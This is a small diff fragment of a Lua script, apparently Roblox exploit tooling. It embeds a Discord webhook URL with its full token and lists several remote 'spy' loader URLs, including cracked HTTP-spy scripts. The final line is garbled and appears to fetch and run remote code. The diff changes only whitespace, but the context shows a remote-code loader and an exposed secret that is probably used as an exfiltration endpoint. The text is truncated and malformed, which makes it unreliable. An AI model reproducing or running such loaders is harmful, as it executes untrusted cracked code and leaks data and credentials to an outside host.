@@ -2,7 +2,7 @@
 local webhookURL = "https://discord.com/api/webhooks/1487054370427113482/rcdMq1CvZzY76Krdzz1S0EVMN3Z9ueFvhfS1jUMatS95Y9i2T-_crvP4il8f23V54Ew6"
 
 local spyURLs = {
-    "https://rawscripts.net/raw/Universal-Script-OctoSpy-22363",
+"https://rawscripts.net/raw/Universal-Script-OctoSpy-22363",
 "https://raw.githubusercontent.com/CookieCrumble2/SkidSpy/refs/heads/main/Loader.luau",
 "https://seere.vip/cracks/httpspy.lua",
 "https://seere.vip/cracks/httpspy.lua"%7D).Body)()",
